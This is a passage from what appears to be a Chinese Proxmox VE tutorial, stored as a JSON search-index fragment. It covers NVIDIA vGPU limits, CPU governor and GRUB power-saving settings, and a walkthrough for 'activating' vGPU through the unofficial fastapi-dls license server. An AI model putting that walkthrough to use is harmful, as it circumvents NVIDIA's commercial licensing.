<p>\u200b\u5173\u4e8e\u200b\u8fd9\u5757\u200b\u7684\u200b\u9650\u5236\u200b\u6709\u200b\u54ea\u4e9b\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u5355\u72ec\u200b\u653e\u5230\u200b\u4e86\u200b\u4e0b\u200b\u4e00\u200b\u5c0f\u8282\u200b\u6765\u200b\u53d9\u8ff0\u200b\u3002 </p>"},{"location":"4/5/#vgpu_1","title":"vGPU \u200b\u9650\u5236","text":"<p>\u200b\u90a3\u4e48\u200b\u80af\u5b9a\u200b\u6709\u200b\u5c0f\u4f19\u4f34\u200b\u4eec\u200b\u597d\u5947\u200b vGPU \u200b\u4e0d\u200b\u5b58\u5728\u200b\u6709\u200b\u54ea\u4e9b\u200b\u7f3a\u70b9\u200b\u548c\u200b\u9650\u5236\u200b\u5462\u200b\uff1f\u200b\u8fd9\u5757\u200b\u56fd\u5149\u200b\u6211\u200b\u6d4b\u8bd5\u200b\u8fc7\u200b\u5f88\u591a\u200b\uff0c\u200b\u5728\u200b\u914d\u5408\u200b NVIDIA \u200b\u5b98\u65b9\u200b \u200b\u548c\u200b\u7fa4\u53cb\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6700\u7ec8\u200b\u4e5f\u200b\u627e\u5230\u200b\u4e86\u200b\u4e00\u70b9\u70b9\u200b\u89c4\u5f8b\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u6fc0\u6d3b\u200b vGPU \u200b\u7684\u8bdd\u200b\uff0c\u200b\u968f\u7740\u200b\u5f00\u673a\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\u7684\u200b\u63a8\u79fb\u200b\uff0c\u200b\u5e27\u200b\u6570\u4f1a\u200b\u9010\u6e10\u200b\u4e0b\u964d\u200b\uff0c\u200b\u5206\u4e3a\u200b\u51e0\u4e2a\u200b\u6863\u4f4d\u200b\uff0c\u200b\u4ece\u200b 60FPS \u200b\u964d\u5230\u200b 15FPS \u200b\u6700\u7ec8\u200b\u4f1a\u200b\u975e\u5e38\u200b\u5361\u987f\u200b\u53ea\u6709\u200b 3FPS\uff1a</p> <p> </p> <p>\u200b\u800c\u4e14\u200b CUDA \u200b\u529f\u80fd\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u9a8c\u8bc1\u200b CUDA \u200b\u662f\u5426\u200b\u6b63\u5e38\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6211\u4eec\u200b\u9996\u5148\u200b\u5b89\u88c5\u200b NVIDIA  CUDA \u200b\u5de5\u5177\u5305\u200b\uff0c\u200b\u867d\u7136\u200b GPU-Z \u200b\u8f6f\u4ef6\u200b\u663e\u793a\u200b\u652f\u6301\u200b CUDA\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u672a\u6fc0\u6d3b\u200b\u957f\u65f6\u95f4\u200b\u4f7f\u7528\u200b\u7684\u8bdd\u200b\uff0c\u200b\u901a\u8fc7\u200b N \u200b\u5361\u200b\u5b98\u65b9\u200b\u7684\u200b dmeo \uff08\u200b\u6ce8\u610f\u200b\u81ea\u5df1\u200b\u7248\u672c\u200b\u7684\u200b\u8def\u5f84\u200b\uff09\u200b\u6d4b\u8bd5\u200b\u5e76\u200b\u4e0d\u80fd\u200b\u987a\u5229\u200b\u8fd0\u884c\u200b\uff1a</p> Bash<pre><code>\"C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v12.0\\extras\\demo_suite\\bandwidthTest.exe\"\n</code></pre> <p>\u200b\u5982\u679c\u200b\u6700\u540e\u200b\u90fd\u200b\u663e\u793a\u200b Result = PASS \u200b\u5219\u200b\u8bf4\u660e\u200b CUDA \u200b\u5b89\u88c5\u200b\u6210\u529f\u200b\u4e14\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b demo \u200b\u91cc\u9762\u200b\u8c03\u7528\u200b CUDA \u200b\u7684\u200b exe \u200b\u6d4b\u8bd5\u200b\u5c0f\u200b\u7a0b\u5e8f\u200b\u4e5f\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\uff1a</p> Bash<pre><code>\"C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v12.0\\extras\\demo_suite\\oceanFFT.exe\"\n</code></pre> <p> </p>"},{"location":"4/5/#vgpu_2","title":"vGPU \u200b\u6fc0\u6d3b","text":""},{"location":"4/5/#_9","title":"\u5b89\u88c5\u200b\u5bb9\u5668","text":"<p>vGPU \u200b\u76ee\u524d\u200b\u56fd\u5916\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6210\u719f\u200b\u7684\u200b fastapi-dls \u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff0c\u200b\u5b98\u65b9\u200b\u8fd8\u200b\u8d34\u5fc3\u200b\u4e86\u200b\u5c01\u88c5\u200b\u4e86\u200b docker \u200b\u5bb9\u5668\u200b\u3002</p> <p>DockerHub \u200b\u7684\u200b fastapi-dls \u200b\u7684\u200b\u5bb9\u5668\u200b\u5730\u5740\u200b\u662f\u200b\uff1ahttps://hub.docker.com/r/collinwebdesigns/fastapi-dls</p> <p>\u200b\u6839\u636e\u200b\u5b98\u65b9\u200b\u7684\u200b README \u200b\u6765\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\uff1a</p> Bash<pre><code># \u200b\u8bbe\u5b9a\u200b\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u5e76\u200b\u521b\u5efa\u200b\nWORKING_DIR=/opt/docker/fastapi-dls/cert\nmkdir -p $WORKING_DIR\n\n# \u200b\u751f\u6210\u200b\u76f8\u5173\u200b\u8bc1\u4e66\u200b\ncd $WORKING_DIR\nopenssl genrsa -out $WORKING_DIR/instance.private.pem 2048 \nopenssl rsa -in $WORKING_DIR/instance.private.pem -outform PEM -pubout -out $WORKING_DIR/instance.public.pem\nopenssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout  $WORKING_DIR/webserver.key -out $WORKING_DIR/webserver.crt\n\n# \u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\u7684\u200b\u5b98\u65b9\u200b\u5efa\u8bae\u200b\u547d\u4ee4\u200b\ndocker run -e DLS_URL=`hostname -i` -e DLS_PORT=443 -p 443:443 -v $WORKING_DIR:/app/cert collinwebdesigns/fastapi-dls:latest\n</code></pre> Docker \u200b\u542f\u52a8\u200b\u76f8\u5173\u200b\u7684\u200b\u5176\u4ed6\u200b\u76f8\u5173\u200b\u7684\u200b\u53d8\u91cf\u200b \u200b\u53d8\u91cf\u200b \u200b\u9ed8\u8ba4\u200b \u200b\u7528\u6cd5\u200b DEBUG false \u200b\u5207\u6362\u200b\u8c03\u8bd5\u6a21\u5f0f\u200b fastapi DLS_URL localhost \u200b\u5ba2\u6237\u7aef\u200b\u8bbf\u95ee\u200b dls \u200b\u5b9e\u4f8b\u200b\u7684\u200b URL \u200b\u5730\u5740\u200b DLS_PORT 443 dls \u200b\u5b9e\u4f8b\u200b\u7684\u200b\u7aef\u53e3\u200b 192.168.1.6 LEASE_EXPIRE_DAYS 90 \u200b\u8bc1\u4e66\u200b\u7b7e\u53d1\u200b\u65f6\u95f4\u200b\uff08\u200b\u5929\u200b\uff09 DATABASE sqlite:///db.sqlite \u200b\u7ec6\u8282\u200b\u53c2\u8003\u200b\u5b98\u65b9\u200b SQLAlchemy \u200b\u6587\u6863\u200b CORS_ORIGINS https://{DLS_URL} \u200b\u8bbe\u7f6e\u200b\u6807\u5934\u200b Access-Control-Allow-Origin SITE_KEY_XID 00000000-0000-0000-0000-000000000000 \u200b\u7ad9\u70b9\u200b\u6807\u8bc6\u200b uuid INSTANCE_REF 00000000-0000-0000-0000-000000000000 \u200b\u5b9e\u4f8b\u200b\u6807\u8bc6\u200b uuid INSTANCE_KEY_RSA /cert/instance.private.pem JWT \u200b\u76f8\u5173\u200b\u7684\u200b RSA \u200b\u5bc6\u94a5\u200b INSTANCE_KEY_PUB /cert/instance.public.pem \u200b\u7ad9\u70b9\u200b\u8303\u56f4\u200b\u7684\u200b\u516c\u94a5\u200b <p>\u200b\u5b9e\u9645\u4e0a\u200b\u6211\u4eec\u200b\u4e3b\u8981\u200b\u5173\u6ce8\u200b\u4e00\u4e0b\u200b DLS_URL \u200b\u53c2\u6570\u200b\uff0c\u200b\u6362\u6210\u200b\u81ea\u5df1\u200b\u7684\u200b  Guest \u200b\u6765\u5bbe\u200b\u5ba2\u6237\u7aef\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u5230\u200b\u7684\u200b IP \u200b\u5730\u5740\u200b\u5373\u53ef\u200b\uff0c\u200b\u7136\u540e\u200b\u6539\u200b\u4e00\u4e0b\u200b\u6388\u6743\u200b\u65f6\u95f4\u200b\u4e3a\u200b 1825 \u200b\u5929\u200b\uff085\u200b\u5e74\u200b\uff09\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u6700\u7ec8\u200b\u7684\u200b\u521b\u5efa\u200b\u5bb9\u5668\u200b\u7684\u200b\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code>docker run -e LEASE_EXPIRE_DAYS=1825 -e DLS_URL=192.168.1.6 -e DLS_PORT=443 -p 443:443 -v $WORKING_DIR:/app/cert collinwebdesigns/fastapi-dls:latest\n</code></pre> <p> </p>"},{"location":"4/5/#_10","title":"\u5bb9\u5668\u200b\u63a5\u53e3","text":"<p>\u200b\u4e0b\u8868\u200b\u53ea\u200b\u5217\u51fa\u200b\u4e86\u200b\u4e3b\u8981\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u66f4\u200b\u8be6\u7ec6\u200b\u7684\u200b\u63a5\u53e3\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b <code>/-/docs</code> \u200b\u548c\u200b <code>/-/redoc</code> \u200b\u7684\u200b PATH \u200b\u63a5\u53e3\u200b\u6587\u6863\u200b\u3002</p> \u200b\u8bf7\u6c42\u200b\u65b9\u6cd5\u200b PATH \u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b GTE <code>/</code> \u200b\u91cd\u5b9a\u5411\u200b\u5230\u200b <code>/-/readme</code> GTE <code>/-/health</code> \u200b\u7528\u4e8e\u200b\u8fd0\u884c\u72b6\u51b5\u200b\u68c0\u67e5\u200b\uff0c\u200b\u8fd8\u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u7248\u672c\u200b\u548c\u200b\u63d0\u4ea4\u200b\u54c8\u5e0c\u200b\u3002 GTE <code>/-/readme</code> HTML \u200b\u9875\u9762\u200b\u5c55\u793a\u200b README.md GTE <code>/-/docs</code> <code>GET /-/openapi.json</code> \u200b\u5c55\u793a\u200b Swagger UI \u200b\u9875\u9762\u200b\u7684\u200b\u63a5\u53e3\u200b\u6587\u6863\u200b GTE <code>/-/redoc</code> <code>GET /-/openapi.json</code> \u200b\u5c55\u793a\u200b ReDoc \u200b\u9875\u9762\u200b\u7684\u200b\u63a5\u53e3\u200b\u6587\u6863\u200b GTE <code>/-/manage</code> \u200b\u663e\u793a\u200b\u7528\u4e8e\u200b\u5220\u9664\u200b\u6e90\u200b\u6216\u200b\u79df\u7ea6\u200b\u7684\u200b\u975e\u5e38\u200b\u57fa\u672c\u200b\u7684\u200b UI GTE <code>/-/origins?leases=false</code> \u200b\u5217\u51fa\u200b\u6ce8\u518c\u200b\u7684\u200b\u539f\u4ea7\u5730\u200b\uff0corigin \u200b\u53c2\u6570\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5305\u62ec\u200b\u6bcf\u4e2a\u200b\u79df\u7ea6\u200b\u7684\u200b\u5f15\u7528\u200b\u6e90\u200b DELETE <code>/-/origins</code> \u200b\u5220\u9664\u200b\u6240\u6709\u200b\u6e90\u200b\u53ca\u5176\u200b\u79df\u7ea6\u200b GTE <code>/-/leases?origin=false</code> \u200b\u5217\u51fa\u200b\u5f53\u524d\u200b\u79df\u7ea6\u200b\uff0corigin \u200b\u53c2\u6570\u200b\u6307\u200b\u7684\u200b\u662f\u200b\u5305\u62ec\u200b\u6bcf\u4e2a\u200b\u79df\u7ea6\u200b\u7684\u200b\u5f15\u7528\u200b\u6e90\u200b DELETE <code>/-/lease/{lease_ref}</code> \u200b\u5220\u9664\u200b\u79df\u7ea6\u200b GTE <code>/client-token</code> \u200b\u751f\u6210\u200b\u5ba2\u6237\u7aef\u200b\u4ee4\u724c"},{"location":"4/5/#_11","title":"\u7eed\u7ea6\u200b\u6388\u6743","text":"<ul> <li>Windows</li> </ul> <p>\u200b\u9996\u5148\u200b\u8bf7\u6c42\u200b\u751f\u6210\u200b\u5ba2\u6237\u7aef\u200b\u4ee4\u724c\u200b\u7684\u200b\u63a5\u53e3\u200b <code>/client-token</code> \u200b\u62ff\u5230\u200b\u6388\u6743\u200b\u6587\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u653e\u5165\u200b\u5230\u200b\u4e0b\u9762\u200b\u7684\u200b\u8def\u5f84\u200b\uff1a</p> Bash<pre><code>C:\\Program Files\\NVIDIA Corporation\\vGPU Licensing\\ClientConfigToken\n</code></pre> <p> </p> <p>\u200b\u91cd\u542f\u200b\u7535\u8111\u200b\u5373\u53ef\u200b\u770b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b Guest \u200b\u6765\u5bbe\u200b\u5ba2\u6237\u7aef\u200b\u5df2\u7ecf\u200b\u6b63\u5e38\u200b\u62ff\u5230\u200b\u6388\u6743\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u884c\u200b\u67e5\u770b\u200b\u6388\u6743\u200b\u7ec6\u8282\u200b\uff1a</p> Bash<pre><code>nvidia-smi -q |findstr License\n</code></pre> <p> </p> <ul> <li>Linux</li> </ul> <p>Linux \u200b\u4f7f\u7528\u200b\u4e0b\u9762\u200b\u547d\u4ee4\u200b\u4e0b\u8f7d\u200b\u6388\u6743\u200b\u6587\u4ef6\u200b\u5230\u200b <code>/etc/nvidia/ClientConfigToken/</code> \u200b\u4e0b\u200b\u7136\u540e\u200b\u91cd\u542f\u200b\u670d\u52a1\u200b\u5373\u53ef\u200b\uff1a</p> Bash<pre><code># \u200b\u4e0b\u8f7d\u200b\u6388\u6743\u200b\u6587\u4ef6\u200b\ncurl --insecure -X GET https://&lt;dls-hostname-or-ip&gt;/client-token -o /etc/nvidia/ClientConfigToken/client_configuration_token.tok\nservice nvidia-gridd restart\n\n# \u200b\u67e5\u770b\u200b\u6388\u6743\u200b\u7ec6\u8282\u200b\nnvidia-smi -q | grep \"License\"\n</code></pre>"},{"location":"4/5/#_12","title":"\u53c2\u8003\u200b\u94fe\u63a5","text":"<ul> <li>vGPU\u200b\u8d44\u6e90\u200b\u4fe1\u606f\u200b</li> <li>NVIDIA vGPU on Proxmox VE 7.x</li> <li>PolloLoco / NVIDIA vGPU Guide \u00b7 GitLab</li> <li>\u200b\u4f5b\u897f\u200b\u535a\u5ba2\u200b - \u200b\u6765\u81ea\u200b\u6c11\u95f4\u200b\u7684\u200bvGPU\u200b\u6388\u6743\u200bfastapi-dls</li> <li>\u200b\u7533\u8bf7\u200bNVIDIA vGPU License - hczhang.cn</li> <li>\u200b\u90e8\u7f72\u200bNVIDIA vGPU License Server - hczhang.cn</li> <li>\u200b\u914d\u7f6e\u200bNVIDIA License Server - hczhang.cn</li> <li>https://git.collinwebdesigns.de/oscar.krause/fastapi-dls</li> <li>https://gitea.publichub.eu/oscar.krause/fastapi-dls</li> <li>https://hub.docker.com/r/collinwebdesigns/fastapi-dls</li> </ul>"},{"location":"4/6/","title":"\u529f\u8017\u200b\u8282\u80fd","text":""},{"location":"4/6/#_1","title":"\u57fa\u7840\u77e5\u8bc6","text":"<p>cpufreq \u200b\u662f\u200b\u4e00\u4e2a\u200b\u52a8\u6001\u200b\u8c03\u6574\u200b cpu \u200b\u9891\u7387\u200b\u7684\u200b\u6a21\u5757\u200b\uff0c\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u65f6\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u5939\u200b /sys/devices/system/cpu/cpu0/cpufreq/ \u200b\u91cc\u9762\u200b\u6709\u200b\u51e0\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u5176\u4e2d\u200b scaling_min_freq \u200b\u4ee3\u8868\u200b\u6700\u4f4e\u200b\u9891\u7387\u200b\uff0cscaling_max_freq \u200b\u4ee3\u8868\u200b\u6700\u9ad8\u200b\u9891\u7387\u200b\uff0cscaling_governor \u200b\u4ee3\u8868\u200b cpu \u200b\u9891\u7387\u200b\u8c03\u6574\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u7528\u200b\u5b83\u200b\u6765\u200b\u63a7\u5236\u200b CPU \u200b\u9891\u7387\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u6211\u4eec\u200b\u770b\u770b\u200b PVE \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u4f7f\u7528\u200b\u7684\u200b CPU \u200b\u7535\u6e90\u200b\u7b56\u7565\u200b\u4e3a\u200b\uff1aperformance \u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\uff1a</p> Bash<pre><code># \u200b\u67e5\u770b\u200b\u652f\u6301\u200b\u7684\u200b CPU \u200b\u7535\u6e90\u200b\u6a21\u5f0f\u200b\ncat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors\n\n# \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u7684\u200b CPU \u200b\u7535\u6e90\u200b\u6a21\u5f0f\u200b\ncat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b PVE  \u200b\u4e0b\u200b\u9ed8\u8ba4\u200b\u652f\u6301\u200b conservative\u3001ondemand\u3001userspace\u3001powersave\u3001performance\u3001schedutil \u200b\u8fd9\u200b 6 \u200b\u79cd\u200b CPU  \u200b\u7535\u6e90\u200b\u6a21\u5f0f\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u529f\u8017\u200b\u6ce8\u5b9a\u200b\u4e0d\u4f1a\u200b\u5f88\u200b\u4f4e\u200b\u3002 </p> <p>\u200b\u51e0\u79cd\u200b\u7535\u6e90\u200b\u6a21\u5f0f\u200b\u7684\u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b\uff1a</p> \u200b\u7535\u6e90\u200b\u6a21\u5f0f\u200b \u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b performance \u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5c06\u200b CPU \u200b\u9891\u7387\u200b\u56fa\u5b9a\u200b\u5de5\u4f5c\u200b\u5728\u200b\u5176\u200b\u652f\u6301\u200b\u7684\u200b\u8f83\u200b\u9ad8\u200b\u8fd0\u884c\u200b\u9891\u7387\u200b\u4e0a\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u52a8\u6001\u200b\u8c03\u8282\u200b\u3002 userspace \u200b\u7cfb\u7edf\u200b\u5c06\u200b\u53d8\u9891\u200b\u7b56\u7565\u200b\u7684\u200b\u51b3\u7b56\u6743\u200b\u4ea4\u7ed9\u200b\u4e86\u200b\u7528\u6237\u200b\u6001\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff0c\u200b\u8f83\u4e3a\u200b\u7075\u6d3b\u200b\u3002 powersave \u200b\u7701\u200b\u7535\u200b\u6a21\u5f0f\u200b\uff0cCPU \u200b\u4f1a\u200b\u56fa\u5b9a\u200b\u5de5\u4f5c\u200b\u5728\u200b\u5176\u200b\u652f\u6301\u200b\u7684\u200b\u6700\u4f4e\u200b\u8fd0\u884c\u200b\u9891\u7387\u200b\u4e0a\u200b\u3002 ondemand \u200b\u6309\u200b\u9700\u200b\u5feb\u901f\u200b\u52a8\u6001\u200b\u8c03\u6574\u200b CPU \u200b\u9891\u7387\u200b\uff0c\u200b\u6ca1\u6709\u200b\u8d1f\u8f7d\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u8fd0\u884c\u200b\u5728\u200b\u4f4e\u9891\u200b\uff0c\u200b\u6709\u200b\u8d1f\u8f7d\u200b\u5c31\u200b\u9ad8\u9891\u200b\u8fd0\u884c\u200b\u3002 conservative \u200b\u4e0e\u200b ondemand \u200b\u4e0d\u540c\u200b\uff0c\u200b\u5e73\u6ed1\u200b\u5730\u200b\u8c03\u6574\u200b CPU \u200b\u9891\u7387\u200b\uff0c\u200b\u9891\u7387\u200b\u7684\u200b\u5347\u964d\u200b\u662f\u200b\u6e10\u53d8\u200b\u5f0f\u200b\u7684\u200b\uff0c\u200b\u7a0d\u5fae\u200b\u7f13\u548c\u200b\u4e00\u70b9\u200b\u3002 schedutil \u200b\u8d1f\u8f7d\u200b\u53d8\u5316\u200b\u56de\u8c03\u200b\u673a\u5236\u200b\uff0c\u200b\u540e\u9762\u200b\u65b0\u200b\u5f15\u5165\u200b\u7684\u200b\u673a\u5236\u200b\uff0c\u200b\u901a\u8fc7\u200b\u89e6\u53d1\u200b schedutil <code>sugov_update</code> \u200b\u8fdb\u884c\u200b\u8c03\u9891\u200b\u52a8\u4f5c\u200b\u3002"},{"location":"4/6/#_2","title":"\u4f18\u5316\u200b\u4e4b\u524d","text":"<p>\u200b\u4e0b\u56fe\u200b\u4e2d\u200b\u9ed8\u8ba4\u200b\u5f00\u542f\u200b 3 \u200b\u4e2a\u200b VM \u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u4f7f\u7528\u200b lscpu \u200b\u67e5\u770b\u200b\u4e00\u4e0b\u200b CPU \u200b\u7684\u200b\u9891\u7387\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b CPU \u200b\u8fd8\u662f\u200b\u6bd4\u8f83\u200b\u6d3b\u8dc3\u200b\u7684\u200b\uff0c\u200b\u4e00\u76f4\u200b\u5904\u4e8e\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u9891\u7387\u200b\uff1a </p> <p> </p> <p>\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u529f\u8017\u200b\u964d\u200b\u4e0d\u200b\u4e0b\u6765\u200b\uff0c \u200b\u6b64\u65f6\u200b\u529f\u8017\u200b\u4e3a\u200b 306W\uff1a</p> <p></p>"},{"location":"4/6/#_3","title":"\u7701\u200b\u7535\u200b\u4f18\u5316","text":""},{"location":"4/6/#cpu","title":"\u8c03\u6574\u200b CPU \u200b\u6a21\u5f0f","text":"<p>\u200b\u9996\u5148\u200b\u5f97\u200b\u5b89\u88c5\u200b cpupower\uff1a</p> Bash<pre><code>apt install linux-cpupower\n</code></pre> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b cpupower \u200b\u7684\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u547d\u4ee4\u200b\uff1a</p> Bash<pre><code># CPU\u200b\u5b9e\u65f6\u200b\u9891\u7387\u200b\u67e5\u770b\u200b\nwatch -n 1 cpupower monitor\n\n# \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u6240\u6709\u200bCPU\u200b\u7684\u200b\u4fe1\u606f\u200b\ncpupower -c all frequency-info\n\n# \u200b\u8bbe\u7f6e\u200b\u6240\u6709\u200bCPU\u200b\u4e3a\u200b\u8282\u80fd\u200b\u6a21\u5f0f\u200b\ncpupower -c all frequency-set -g powersave\n\n# \u200b\u8bbe\u7f6e\u200b\u6240\u6709\u200bCPU\u200b\u4e3a\u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\ncpupower -c all frequency-set -g performance\n</code></pre> <p>\u200b\u56e0\u4e3a\u200b PVE \u200b\u4e0b\u200b\u9ed8\u8ba4\u200b\u7684\u200b CPU \u200b\u7535\u6e90\u200b\u7b56\u7565\u200b\u5c31\u662f\u200b performance \u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u8fd9\u91cc\u200b\u5c06\u200b\u5176\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u4fdd\u5b88\u200b\u4e00\u70b9\u200b\u7684\u200b conservative \u200b\u6a21\u5f0f\u200b\uff1a</p> Bash<pre><code>cpupower -c all frequency-set -g conservative\n</code></pre> <p>\u200b\u6b64\u65f6\u200b\u68c0\u6d4b\u200b\u9891\u7387\u200b\u53d1\u73b0\u200b\u6240\u6709\u200b\u7684\u200b  CPU \u200b\u9891\u7387\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u4e0b\u6765\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u6211\u4eec\u200b\u8fd9\u6837\u200b\u64cd\u4f5c\u200b\u540e\u200b\uff0c\u200b\u91cd\u542f\u200b\u540e\u200b\u53c8\u200b\u53d8\u6210\u200b\u6027\u80fd\u200b\u6a21\u5f0f\u200b\u4e86\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u65b9\u6cd5\u200b\u603b\u200b\u6bd4\u200b\u56f0\u96be\u200b\u591a\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u5c06\u200b\u9650\u5236\u200b\u529f\u8017\u200b\u7684\u200b\u547d\u4ee4\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u670d\u52a1\u200b\uff0c\u200b\u7136\u540e\u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\u5373\u53ef\u200b\u3002\u200b\u65f6\u95f4\u200b\u6709\u9650\u200b\uff0c\u200b\u56fd\u5149\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5c55\u5f00\u200b\u8bf4\u200b\u4e86\u200b\uff0c\u200b\u5927\u5bb6\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u7814\u7a76\u200b\u770b\u770b\u200b\u3002 </p>"},{"location":"4/6/#_4","title":"\u4f18\u5316\u200b\u663e\u5361\u200b\u5f85\u673a","text":"<p>\u200b\u6211\u4eec\u200b\u7684\u200b PVE \u200b\u5bbf\u4e3b\u673a\u200b\u5bf9\u200b\u663e\u5361\u200b\u7684\u200b\u5f85\u673a\u200b\u5f88\u200b\u4e0d\u200b\u53cb\u597d\u200b\uff0c\u200b\u6211\u200b\u7684\u200b RX 580 \u200b\u5982\u679c\u200b\u9ed8\u8ba4\u200b\u88ab\u200b PVE \u200b\u52a0\u8f7d\u200b\u7684\u8bdd\u200b\uff0c\u200b\u65e5\u5e38\u200b\u5f85\u673a\u200b\u90fd\u200b\u5f97\u200b 75W \u200b\u5de6\u53f3\u200b\u7740\u5b9e\u200b\u86cb\u75bc\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u5728\u200b grub \u200b\u4e0b\u9762\u200b\u6dfb\u52a0\u200b\u5982\u4e0b\u200b 4 \u200b\u4e2a\u200b\u5173\u95ed\u200b\u663e\u5361\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> \u200b\u53c2\u6570\u200b \u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b video=vesafb:off \u200b\u7981\u7528\u200b vesa \u200b\u542f\u52a8\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b video=efifb:off \u200b\u7981\u7528\u200b efi \u200b\u542f\u52a8\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b video=simplefb:off 5.15 \u200b\u5185\u6838\u200b\u5f00\u59cb\u200b\u76f4\u901a\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b initcall_blacklist=sysfb_init \u200b\u90e8\u5206\u200b A \u200b\u5361\u5982\u200b RX580 \u200b\u76f4\u901a\u200b\u5f02\u5e38\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b <p>\u200b\u6700\u7ec8\u200b\u6211\u200b\u7684\u200b GRUB \u200b\u7684\u200b\u53c2\u6570\u200b\u914d\u7f6e\u200b\u5982\u4e0b\u200b\uff1a</p> INI<pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt textonly nomodeset nofb pci=noaer pcie_acs_override=downstream,multifunction video=vesafb:off video=efifb:off video=simplefb:off initcall_blacklist=sysfb_init\"\n</code></pre> <p>\u200b\u6539\u5b8c\u200b\u8bb0\u5f97\u200b\u4f7f\u7528\u200b <code>update-grub</code> \u200b\u66f4\u65b0\u200b\u4e00\u4e0b\u200b grub \u200b\u914d\u7f6e\u6587\u4ef6\u200b\u518d\u200b\u91cd\u542f\u200b</p>"},{"location":"4/6/#_5","title":"\u4f18\u5316\u200b\u4e4b\u540e","text":"<p>\u200b\u901a\u8fc7\u200b\u4e0a\u8ff0\u200b\u7684\u200b\u4f18\u5316\u200b\uff0c\u200b\u6211\u4eec\u200b\u7684\u200b\u65e5\u5e38\u200b\u5f85\u673a\u200b\u529f\u8017\u200b\u4ece\u200b 306W \u200b\u964d\u4f4e\u200b\u5230\u200b\u4e86\u200b 